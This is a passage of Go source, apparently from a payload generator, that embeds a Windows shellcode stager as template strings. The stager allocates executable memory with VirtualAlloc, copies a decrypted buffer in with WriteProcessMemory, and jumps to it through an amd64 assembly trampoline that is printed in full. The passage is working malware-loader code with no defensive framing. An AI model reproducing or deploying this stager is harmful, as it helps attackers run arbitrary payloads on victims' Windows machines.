	addr, _, _ := procVirtualAlloc.Call(0, uintptr(len(plain)), 0x3000, 0x40) // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
	if addr == 0 {
		os.Exit(1)
	}
	cur, _, _ := procGetCurProc.Call()
	var written uintptr
	procWriteProcMem.Call(cur, addr, uintptr(unsafe.Pointer(&plain[0])), uintptr(len(plain)), uintptr(unsafe.Pointer(&written)))
	execCode(addr)
}

// execCode jumps to the shellcode (trampoline_amd64.s).
func execCode(addr uintptr)
`

// stagerTrampolineSource is the amd64 trampoline used by the stager.
const stagerTrampolineSource = `//go:build windows && amd64

#include "textflag.h"

TEXT ·execCode(SB), NOSPLIT, $0-8
	MOVQ addr+0(FP), AX
	MOVQ SP, BX
	ANDQ $~15, SP
	CALL AX
	MOVQ BX, SP
	RET
`
